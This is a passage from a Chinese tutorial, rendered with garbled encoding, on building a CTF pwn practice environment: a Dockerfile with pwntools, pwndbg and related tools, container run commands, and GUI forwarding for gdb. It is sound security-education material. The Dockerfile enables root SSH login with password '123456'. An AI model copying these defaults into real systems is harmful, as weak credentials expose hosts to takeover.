åˆ°ä¸€å®šç¨‹åº¦åå†å»æ ¹æ®ä¸ªäººä½¿ç”¨ä¹ æƒ¯è¿›è¡Œå†³å®šã€‚</p><p>æ­¤å¤–ï¼Œéƒ¨åˆ†é¢˜ç›®å¯èƒ½éœ€è¦ä¸€äº›é¢å¤–çš„ç¯å¢ƒï¼ˆä¾‹å¦‚ kernel pwn éœ€è¦ qemuï¼‰ï¼Œæˆ‘ä»¬å°†åœ¨åç»­ä»‹ç»åˆ°å¯¹åº”é¢˜ç›®æ—¶å•ç‹¬è¿›è¡Œä»‹ç»ã€‚</p><h1 id="0x01-ä½¿ç”¨-Docker-æ­å»º-CTF-Pwn-åšé¢˜ç¯å¢ƒï¼ˆæ¨èï¼‰"><a href="#0x01-ä½¿ç”¨-Docker-æ­å»º-CTF-Pwn-åšé¢˜ç¯å¢ƒï¼ˆæ¨èï¼‰" class="headerlink" title="0x01. ä½¿ç”¨ Docker æ­å»º CTF Pwn åšé¢˜ç¯å¢ƒï¼ˆæ¨èï¼‰"></a>0x01. ä½¿ç”¨ Docker æ­å»º CTF Pwn åšé¢˜ç¯å¢ƒï¼ˆæ¨èï¼‰</h1><p>ä¸ºäº†ä¿è¯åˆ©ç”¨è„šæœ¬èƒ½å¤Ÿæ­£å¸¸æ‰“é€šï¼Œæˆ‘ä»¬é€šå¸¸éœ€è¦åœ¨æœ¬åœ°å‡†å¤‡ç›¸åŒçš„è¿è¡Œç¯å¢ƒï¼Œå¹¶åœ¨è¿›è¡Œè¿œç¨‹åˆ©ç”¨ä¹‹å‰å…ˆåœ¨æœ¬åœ°è¿›è¡Œæµ‹è¯•ï¼Œä½†ç”±äº CTF é¢˜ç›®è¿œç¨‹ç¯å¢ƒä¼—å¤šï¼Œè‹¥æ˜¯ä¸ºæ¯ä¸ªä¸åŒçš„ç¯å¢ƒéƒ½å•ç‹¬å‡†å¤‡ä¸€ä¸ª Ubuntu è™šæ‹Ÿæœºï¼Œåˆ™ä¸ä»…è¦åœ¨æ¯ä¸ªè™šæ‹Ÿæœºä¸Šéƒ½å®Œæ•´æ­å»ºä¸€éè°ƒè¯•ç¯å¢ƒï¼Œä¸”ä¼šå ç”¨å¤§é‡ç£ç›˜ç©ºé—´ï¼ŒåŒæ—¶ä¹Ÿæ— æ³•ä¿è¯æœ¬åœ°ç¯å¢ƒå°ç‰ˆæœ¬å’Œè¿œç¨‹ç¯å¢ƒä¸€å®šç›¸åŒâ€”â€”é™¤éæ¯ä¸ªå°ç‰ˆæœ¬éƒ½å•ç‹¬åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿæœºå¹¶æ°¸ä¸å‡çº§ï¼Œè¿™ç§è§£å†³æ–¹æ¡ˆå¹¶ä¸ä¼˜é›…ã€‚</p><p>é€šè¿‡ <code>LD_PRELOAD</code> å‚æ•°åœ¨ç¨‹åºæ‰§è¡Œå‰ é¢„å…ˆåŠ è½½ libc åœ¨æŸäº›ç¨‹åº¦ä¸Šæ˜¯ä¸€ä¸ªå¯è¡Œçš„è§£å†³æ–¹æ¡ˆï¼Œåœ¨ libc å¤§ç‰ˆæœ¬ç›¸åŒçš„æƒ…å†µä¸‹è½½å…¥ä¸åŒçš„å°ç‰ˆæœ¬é€šå¸¸å¹¶ä¸ä¼šå‡ºç°é—®é¢˜ï¼Œä½†æ˜¯ç”±äºä¸åŒç³»ç»Ÿç¯å¢ƒä¸­ ld ç‰ˆæœ¬ä¸åŒçš„ç¼˜æ•…ï¼Œå¯¹äºè·¨ ld ç‰ˆæœ¬åŠ è½½ä¸åŒç‰ˆæœ¬çš„ libc åˆ™å¯èƒ½å‡ºç° segmentation faultï¼Œä»è€Œå¯¼è‡´æ— æ³•æ­£å¸¸è¿è¡Œä¸è°ƒè¯•é¢˜ç›®ã€‚</p><p>è™½ç„¶ Linux çš„ç”¨æˆ·ç¯å¢ƒå¹¶ä¸ä¼¼ Windows é‚£æ ·æœ‰ç€å¼ºå£®çš„äºŒè¿›åˆ¶å‰å‘å…¼å®¹æ€§ï¼Œä½†æ˜¯ç”¨æˆ·ç¯å¢ƒä¾æ‰˜äºå†…æ ¸ç¯å¢ƒã€ä¾æ‰˜äºå†…æ ¸å‘ç”¨æˆ·æ€æš´éœ²çš„æ¥å£â€”â€”ç³»ç»Ÿè°ƒç”¨ï¼Œè€Œè¿™å¹¶ä¸æ˜¯ä¼šè½»æ˜“å‘ç”Ÿå˜åŠ¨ä»¥åŠå…¼å®¹æ€§ç ´åçš„ä¸€ä¸ªä¸œè¥¿ï¼Œç”±æ­¤ï¼Œé€šè¿‡é‡æ–°å¼€è¾Ÿä¸€ä¸ªå¯¹åº”çš„æ–°çš„ç”¨æˆ·ç¯å¢ƒçš„æ–¹å¼â€”â€” å³å½¢å¦‚ Docker è¿™æ ·çš„æ“ä½œç³»ç»Ÿå±‚ä¸Šçš„è™šæ‹ŸåŒ–æ–¹æ¡ˆï¼Œæˆ‘ä»¬ä¾¿èƒ½éå¸¸ç®€å•åœ°æ­å»ºä¸åŒçš„ Pwn é¢˜æ‰€å¯¹åº”çš„åŸå§‹ç¯å¢ƒã€‚</p><h2 id="Docker-ç¯å¢ƒæ­å»º"><a href="#Docker-ç¯å¢ƒæ­å»º" class="headerlink" title="Docker ç¯å¢ƒæ­å»º"></a>Docker ç¯å¢ƒæ­å»º</h2><p>Docker çš„å®‰è£…è¯·å¤§å®¶æ ¹æ®è‡ªå·±æ‰€ä½¿ç”¨çš„ Linux å‘è¡Œç‰ˆè‡ªè¡Œå‚ç…§ <a href="https://docs.docker.com/engine/install/">Docker å®˜ç½‘</a> æˆ–æ˜¯å‘è¡Œç‰ˆè‡ªå·±çš„ Wiki è¿›è¡Œé…ç½®ï¼Œè¿™é‡Œä¸å†èµ˜å™ã€‚</p><h2 id="åˆ›å»º-Docker-é•œåƒ"><a href="#åˆ›å»º-Docker-é•œåƒ" class="headerlink" title="åˆ›å»º Docker é•œåƒ"></a>åˆ›å»º Docker é•œåƒ</h2><p>æˆ‘ä»¬ä»¥ä»¥ä¸‹ Dockerfile æ‰€åˆ›å»ºçš„é•œåƒä½œä¸ºæ¨¡æ¿ï¼Œå¤§å®¶å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚è‡ªè¡Œä¿®æ”¹ï¼š</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">22.04</span><br><br><span class="hljs-keyword">ARG</span> DEBIAN_FRONTEND=noninteractive<br><br><span class="hljs-comment"># pre-install softwares</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -i <span class="hljs-string">&quot;s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g&quot;</span> /etc/apt/sources.list &amp;&amp; \</span><br><span class="language-bash">    apt-get -y update &amp;&amp; \</span><br><span class="language-bash">    apt-get install -y lib32z1 apt-transport-https python3 python3-pip git \</span><br><span class="language-bash">    libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev \</span><br><span class="language-bash">    vim nano netcat openssh-server unzip make wget bison flex build-essential \</span><br><span class="language-bash">    curl qemu qemu-system-x86 gcc gdb clang lldb tmux konsole</span><br><br><span class="hljs-comment"># enable ssh login</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">rm</span> -f /etc/service/sshd/down</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> sed -ri <span class="hljs-string">&#x27;s/^#?PermitRootLogin\s+.*/PermitRootLogin yes/&#x27;</span> /etc/ssh/sshd_config &amp;&amp;\</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&#x27;s/#UseDNS\ no/UseDNS\ no/g&#x27;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/StrictModes yes/StrictModes no/g&quot;</span> /etc/ssh/sshd_config &amp;&amp; \</span><br><span class="language-bash">    sed -ri <span class="hljs-string">&quot;s/UsePAM yes/UsePAM no/g&quot;</span> /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># enable login with password</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;PasswordAuthentication yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><br><span class="hljs-comment"># set username and password</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> groupadd arttnba3 &amp;&amp; \</span><br><span class="language-bash">    useradd -g arttnba3 arttnba3 -m -s /bin/bash &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;arttnba3:123456&quot;</span> | chpasswd &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;root:123456&quot;</span> | chpasswd</span><br><br><span class="hljs-comment"># enable ssh key login</span><br><span class="hljs-comment">#RUN mkdir /home/arttnba3/.ssh &amp;&amp; \</span><br><span class="hljs-comment">#    echo &quot;Your ssh key&quot; &gt; /home/arttnba3/.ssh/authorized_keys</span><br><br><span class="hljs-comment"># keep container running</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/sh\nservice ssh restart\nsleep infinity&quot;</span> &gt; /root/start.sh</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">chmod</span> +x /root/start.sh</span><br><br><span class="hljs-comment"># enable sudo</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y sudo &amp;&amp; \</span><br><span class="language-bash">       usermod -aG sudo arttnba3</span><br><br><span class="hljs-comment"># pwn-related tools</span><br><span class="hljs-keyword">RUN</span><span class="language-bash"> python3 -m pip config <span class="hljs-built_in">set</span> global.index-url http://pypi.tuna.tsinghua.edu.cn/simple &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip config <span class="hljs-built_in">set</span> global.trusted-host pypi.tuna.tsinghua.edu.cn &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip install -U pip &amp;&amp; \</span><br><span class="language-bash">    python3 -m pip install --no-cache-dir \</span><br><span class="language-bash">    pwntools \</span><br><span class="language-bash">    ropgadget \</span><br><span class="language-bash">    z3-solver \</span><br><span class="language-bash">    smmap2 \</span><br><span class="language-bash">    apscheduler \</span><br><span class="language-bash">    ropper \</span><br><span class="language-bash">    unicorn \</span><br><span class="language-bash">    keystone-engine \</span><br><span class="language-bash">    capstone \</span><br><span class="language-bash">    angr \</span><br><span class="language-bash">    pebble \</span><br><span class="language-bash">    r2pipe \</span><br><span class="language-bash">    LibcSearcher</span><br><br><span class="hljs-keyword">RUN</span><span class="language-bash"> git <span class="hljs-built_in">clone</span> https://github.com/pwndbg/pwndbg &amp;&amp; \</span><br><span class="language-bash">    <span class="hljs-built_in">cd</span> pwndbg &amp;&amp; <span class="hljs-built_in">chmod</span> +x setup.sh &amp;&amp; ./setup.sh</span><br><br><span class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;/root/start.sh&quot;</span>]</span><br><br><span class="hljs-keyword">EXPOSE</span> <span class="hljs-number">22</span><br></code></pre></td></tr></table></figure><p>åœ¨ä¸€ä¸ªç©ºç™½æ–‡ä»¶å¤¹ä¸­åˆ›å»ºä¸€ä¸ªåä¸º <code>Dockerfile</code> çš„æ–‡ä»¶ï¼Œå¹¶å†™å…¥ä¸Šè¿°å†…å®¹ï¼Œéšåè¿è¡Œå¦‚ä¸‹æŒ‡ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker build -t pwnenv_ubuntu22 .</span><br></code></pre></td></tr></table></figure><p>å®Œæˆä¹‹åä½ ä¾¿æ‹¥æœ‰äº†ä¸€ä¸ªåä¸º <code>pwnenv_ubuntu22</code> çš„å¸¦æœ‰åšé¢˜ç¯å¢ƒçš„ Ubuntu22 é•œåƒï¼Œå¯ä»¥é€šè¿‡ <code>docker images</code> æŒ‡ä»¤æŸ¥çœ‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker images</span>                                              <br>REPOSITORY               TAG         IMAGE ID       CREATED          SIZE                                     <br>pwnenv_ubuntu22          latest      c129ca086a72   15 seconds ago   2.81GB<br></code></pre></td></tr></table></figure><p>ä½ ä¹Ÿå¯ä»¥æ ¹æ®éœ€æ±‚ä¿®æ”¹ç¬¬ä¸€è¡Œçš„åŸºé•œåƒï¼Œä»è€Œåˆ›å»ºåŸºäºä¸åŒ Ubuntu å‘è¡Œç‰ˆçš„ docker é•œåƒã€‚</p><h2 id="ä»-Docker-é•œåƒåˆ›å»ºå®¹å™¨"><a href="#ä»-Docker-é•œåƒåˆ›å»ºå®¹å™¨" class="headerlink" title="ä» Docker é•œåƒåˆ›å»ºå®¹å™¨"></a>ä» Docker é•œåƒåˆ›å»ºå®¹å™¨</h2><p>æˆ‘ä»¬åªéœ€è¦è¿è¡Œå¦‚ä¸‹å‘½ä»¤ä¾¿èƒ½åŸºäºæˆ‘ä»¬åˆšåˆšåˆ›å»ºçš„ Docker é•œåƒåˆ›å»ºä¸€ä¸ªæ–°çš„å®¹å™¨ï¼Œæ–¹ä¾¿èµ·è§ä½ å¯ä»¥å°†å…¶åˆ›å»ºä¸ºä¸€ä¸ªè„šæœ¬ï¼Œå„å‚æ•°è¯´æ˜å¦‚ä¸‹ï¼š</p><ul><li><code>-d</code>ï¼š ä½¿å®¹å™¨åœ¨åå°è¿è¡Œ</li><li><code>-p 25000:2222</code>ï¼š å®¹å™¨çš„ <code>22</code> ç«¯å£æ˜ å°„åˆ°æœ¬åœ°çš„ <code>25000</code> ç«¯å£</li><li><code>--name=pwn22</code>ï¼š å®¹å™¨åä¸º <code>pwn22</code></li><li><code>-v ~/Desktop/CTF:/CTF</code> ï¼š å°†æœ¬åœ°çš„ <code>~/Desktop/CTF</code> ç›®å½•æ˜ å°„åˆ°å®¹å™¨ä¸­çš„ <code>/CTF</code> ç›®å½•ï¼Œè¿™æ ·æˆ‘ä»¬ä¾¿èƒ½åœ¨å®¹å™¨å†…è®¿é—®åˆ°æœ¬åœ°æ–‡ä»¶ï¼Œè€Œæ— éœ€å°†æ–‡ä»¶é‡å¤æ‹·è´è¿›å®¹å™¨ä¸­</li><li><code>pwnenv_ubuntu22</code>ï¼šåˆ›å»ºå®¹å™¨æ‰€ä½¿ç”¨çš„é•œåƒ</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run \</span><br><span class="language-bash">    -d \</span><br><span class="language-bash">    -p 25000:22 \</span><br><span class="language-bash">    --name=pwn22 \</span><br><span class="language-bash">    -v ~/Desktop/CTF:/CTF \</span><br><span class="language-bash">    pwnenv_ubuntu22</span><br></code></pre></td></tr></table></figure><p>ä¹‹åé€šè¿‡å¦‚ä¸‹å‘½ä»¤ä¾¿èƒ½è¿›å…¥åˆ°å®¹å™¨å½“ä¸­ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">exec</span> -w /CTF -e TERM=xterm-256color -it pwn22 bash</span><br></code></pre></td></tr></table></figure><p>å¦‚æœä½ ä¸æƒ³å°†æœ¬åœ°ç›®å½•ä¸å®¹å™¨è¿›è¡Œå…±äº«ï¼Œè€Œæ˜¯æƒ³è¦å°†æ‰€éœ€æ–‡ä»¶æ‹·è´ä¸€ä»½åˆ°å®¹å™¨ä¸­ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ docker cp å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">cp</span> æœ¬åœ°æºæ–‡ä»¶è·¯å¾„ å®¹å™¨å:å®¹å™¨å†…ç›®çš„è·¯å¾„</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker <span class="hljs-built_in">cp</span> å®¹å™¨å:å®¹å™¨å†…æºæ–‡ä»¶è·¯å¾„ æœ¬åœ°ç›®çš„è·¯å¾„</span><br></code></pre></td></tr></table></figure><p>ç”±äºæˆ‘ä»¬ä¸ºå®¹å™¨è®¾ç½®äº† ssh æœåŠ¡ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ ssh è¿æ¥å…¥å®¹å™¨ç¯å¢ƒï¼Œè¿™å…è®¸æˆ‘ä»¬ä½¿ç”¨ vscode ç­‰å·¥å…·è¿æ¥åˆ°å®¹å™¨å†…éƒ¨ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ssh root@localhost -p 25000</span><br></code></pre></td></tr></table></figure><p>è‹¥æ˜¯å®¹å™¨ç¯å¢ƒè¢«æˆ‘ä»¬æŠ˜è…¾åäº†ï¼Œåˆ™å¯ä»¥ç›´æ¥é€šè¿‡ <code>docker rm å®¹å™¨å</code> è¿›è¡Œåˆ é™¤ï¼Œä¹‹åå†é‡æ–°ä½¿ç”¨ <code>docker run</code> åˆ›å»ºæ–°å®¹å™¨å³å¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™ç§æ–¹å¼ä¼šå°†æ–°æ‹·è´è¿›å®¹å™¨çš„æ–‡ä»¶ç»™åˆ é™¤ï¼ˆä½†ä¸ä¼šåˆ é™¤æŒ‚è½½ç›®å½•ï¼‰ã€‚</p><h2 id="å°†-Docker-å®¹å™¨æ¥å…¥æœ¬åœ°å›¾å½¢ç•Œé¢"><a href="#å°†-Docker-å®¹å™¨æ¥å…¥æœ¬åœ°å›¾å½¢ç•Œé¢" class="headerlink" title="å°† Docker å®¹å™¨æ¥å…¥æœ¬åœ°å›¾å½¢ç•Œé¢"></a>å°† Docker å®¹å™¨æ¥å…¥æœ¬åœ°å›¾å½¢ç•Œé¢</h2><p>pwntools è‡ªå¸¦çš„è°ƒè¯•å‘½ä»¤ <code>gdb.attach()</code> éœ€è¦åˆ›å»ºæ–°çš„çª—å£ï¼Œè€Œåœ¨å®¹å™¨ä¸­ç›´æ¥è¿è¡Œä¼šå¤±è´¥ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸ºå®¹å™¨æ¥å…¥æœ¬åœ°çš„å›¾å½¢æœåŠ¡ï¼Œä»¥è¾¾æˆåŸç”Ÿçš„è¿è¡Œæ•ˆæœï¼ˆç›´æ¥å¼¹å‡ºä¸€ä¸ªæ–°çš„çª—å£ï¼‰ã€‚</p><blockquote><p>è‹¥æ˜¯è§‰å¾—è¿™ç§åŠæ³•æ¯”è¾ƒéº»çƒ¦ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©ä½¿ç”¨ tmux é…ç½®å¤šçª—å£ï¼Œåªéœ€åœ¨è¿è¡Œ <code>gdb.attach()</code> å‘½ä»¤å‰è¿è¡Œ <code>context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</code> å³å¯ã€‚</p></blockquote><h3 id="For-Wayland"><a href="#For-Wayland" class="headerlink" title="For Wayland"></a>For Wayland</h3><p>å¯¹äº Wayland ç¯å¢ƒï¼Œåœ¨åˆ›å»ºå®¹å™¨æ—¶æˆ‘ä»¬éœ€è¦é¢å¤–é™„åŠ ä¸€äº›å‚æ•°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run \</span><br><span class="language-bash">    -d \</span><br><span class="language-bash">    -p <span class="hljs-string">&quot;25000:22&quot;</span> \</span><br><span class="language-bash">    --name=pwn22 \</span><br><span class="language-bash">    -v ~/Desktop/CTF:/CTF \</span><br><span class="language-bash">    -e XDG_RUNTIME_DIR=/tmp \</span><br><span class="language-bash">    -e DISPLAY=<span class="hljs-variable">$DISPLAY</span> \</span><br><span class="language-bash">    -e WAYLAND_DISPLAY=<span class="hljs-variable">$WAYLAND_DISPLAY</span> \</span><br><span class="language-bash">    -v <span class="hljs-variable">$XDG_RUNTIME_DIR</span>/<span class="hljs-variable">$WAYLAND_DISPLAY</span>:/tmp/<span class="hljs-variable">$WAYLAND_DISPLAY</span> \</span><br><span class="language-bash">    -e QT_QPA_PLATFORM=wayland \</span><br><span class="language-bash">    pwnenv_ubuntu22</span><br></code></pre></td></tr></table></figure><p>ä¹‹ååœ¨è¿è¡Œ <code>gdb.attach()</code> ä¹‹å‰è¿è¡Œå¦‚ä¸‹ python è¯­å¥ä¹‹ä¸€è¿›è¡Œé…ç½®å³å¯ï¼Œè¯·æ ¹æ®è‡ªå·±æ‰€ä½¿ç”¨çš„æ¡Œé¢ç¯å¢ƒè¿›è¡Œé€‰æ‹©ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">context.terminal = [<span class="hljs-string">&#x27;konsole&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>] <span class="hljs-comment"># for KDE</span><br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>] <span class="hljs-comment"># for Gnome</span><br></code></pre></td></tr></table></figure><h3 id="For-X11"><a href="#For-X11" class="headerlink" title="For X11"></a>For X11</h3><p>å¯¹äºä½¿ç”¨ X11 å›¾å½¢æœåŠ¡çš„ï¼Œåœ¨åˆ›å»ºå®¹å™¨æ—¶æˆ‘ä»¬åˆ™éœ€è¦é™„åŠ å¦‚ä¸‹å‚æ•°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run \</span><br><span class="language-bash">    -d \</span><br><span class="language-bash">    -p <span class="hljs-string">&quot;25000:22&quot;</span> \</span><br><span class="language-bash">    --name=pwn22 \</span><br><span class="language-bash">    -v ~/Desktop/CTF:/CTF \</span><br><span class="language-bash">    -v /tmp/.X11-unix:/tmp/.X11-unix \</span><br><span class="language-bash">    -e DISPLAY=<span class="hljs-variable">$DISPLAY</span> \</span><br><span class="language-bash">    pwnenv_ubuntu22</span><br></code></pre></td></tr></table></figure><p>ä¹‹ååœ¨è¿è¡Œ <code>gdb.attach()</code> ä¹‹å‰è¿è¡Œå¦‚ä¸‹ python è¯­å¥ä¹‹ä¸€è¿›è¡Œé…ç½®å³å¯ï¼Œè¯·æ ¹æ®è‡ªå·±æ‰€ä½¿ç”¨çš„æ¡Œé¢ç¯å¢ƒè¿›è¡Œé€‰æ‹©ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">context.terminal = [<span class="hljs-string">&#x27;konsole&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>] <span class="hljs-comment"># for KDE</span><br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>] <span class="hljs-comment"># for Gnome</span><br></code></pre></td></tr></table></figure><blockquote><p>å‚è€ƒ <a href="https://gist.github.com/turekt/71f6950bc9f048daaeb69479845b672b">Running pwnlib gdb (pwntools) feature inside Docker</a> ã€‚</p></blockquote><h1 id="0x02-åœ¨æœ¬åœ°ç›´æ¥æ­å»º-CTF-Pwn-åšé¢˜ç¯å¢ƒ"><a href="#0x02-åœ¨æœ¬åœ°ç›´æ¥æ­å»º-CTF-Pwn-åšé¢˜ç¯å¢ƒ" class="headerlink" title="0x02. åœ¨æœ¬åœ°ç›´æ¥æ­å»º CTF Pwn åšé¢˜ç¯å¢ƒ"></a>0x02. åœ¨æœ¬åœ°ç›´æ¥æ­å»º CTF Pwn åšé¢˜ç¯å¢ƒ</h1><p>é™¤äº†ä½¿ç”¨ Docker ä¹‹å¤–ï¼Œä½ ä¹Ÿå¯ä»¥ç›´æ¥åœ¨æœ¬åœ°æ­å»ºåšé¢˜ç¯å¢ƒï¼Œå¯¹äºå¸¸è§„çš„ Linux ç”¨æˆ·æ€ pwn é¢˜ç›®ï¼Œæˆ‘ä»¬é€šå¸¸ä»…éœ€è¦å¦‚ä¸‹è½¯ä»¶ï¼š</p><ul><li>IDAï¼šç”¨äºå¯¹é¢˜ç›®è¿›è¡Œé€†å‘åˆ†æã€‚</li><li>Python + pwntoolsï¼šç”¨äºç¼–å†™æ¼æ´åˆ©ç”¨è„šæœ¬ã€‚</li><li>gdb + pwndbg&#x2F;pedaï¼šç”¨äºè°ƒè¯•é¢˜ç›®äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</li></ul><h2 id="è·å–-IDA"><a href="#è·å–-IDA" class="headerlink" title="è·å– IDA"></a>è·å– IDA</h2><p>IDA Proï¼ˆinteractive Disassembler Professionalï¼‰æ˜¯ç”± Hex-Rays å…¬å¸å‡ºå“çš„ä¸€æ¬¾äº¤äº’å¼åæ±‡ç¼–å·¥å…·ï¼Œä¹Ÿæ˜¯è½¯ä»¶é€†å‘å·¥ç¨‹å½“ä¸­æœ€æµè¡Œçš„ä¸€ä¸ªé™æ€åˆ†æå·¥å…·ã€‚é€šè¿‡ IDA Pro æˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å¤åŸäºŒè¿›åˆ¶ç¨‹åºçš„è¿è¡Œé€»è¾‘ï¼Œä»è€Œè¿›ä¸€æ­¥å®¡è®¡å‡ºå…¶ä¸­å­˜åœ¨çš„æ¼æ´ã€‚</p><p><a href="https://hex-rays.com/ida-pro/">IDA Pro</a> ä¸ºä»˜è´¹è½¯ä»¶ï¼Œè½¯ä»¶æœ¬ä½“ä¸ä¸åŒæ¶æ„çš„åç¼–è¯‘å¼•æ“å•ç‹¬è¿›è¡Œæ”¶è´¹ï¼Œä½ å¯ä»¥æ ¹æ®è‡ªå·±çš„éœ€æ±‚åœ¨ Hex-rays çš„å®˜ç½‘è‡ªè¡Œè´­ä¹°ç›¸åº”çš„è½¯ä»¶è®¸å¯è¯ä»¥è¿›è¡Œä½¿ç”¨ã€‚</p><blockquote><p>æˆªè‡³ 2024 å¹´ 4 æœˆï¼Œ IDA Pro æœ¬ä½“è®¸å¯è¯çš„ä»·æ ¼ä¸º 1975 USDï¼Œä»»ä¸€æŒ‡ä»¤é›†æ¶æ„åç¼–è¯‘åŠŸèƒ½çš„è®¸å¯è¯ä»·æ ¼ä¸º 2765 USDã€‚</p></blockquote><p>æ­¤å¤–ï¼ŒHex-rays å…¬å¸è¿˜æä¾›åŸºäºäº‘å¼•æ“çš„å…è´¹é€†å‘å·¥å…· <a 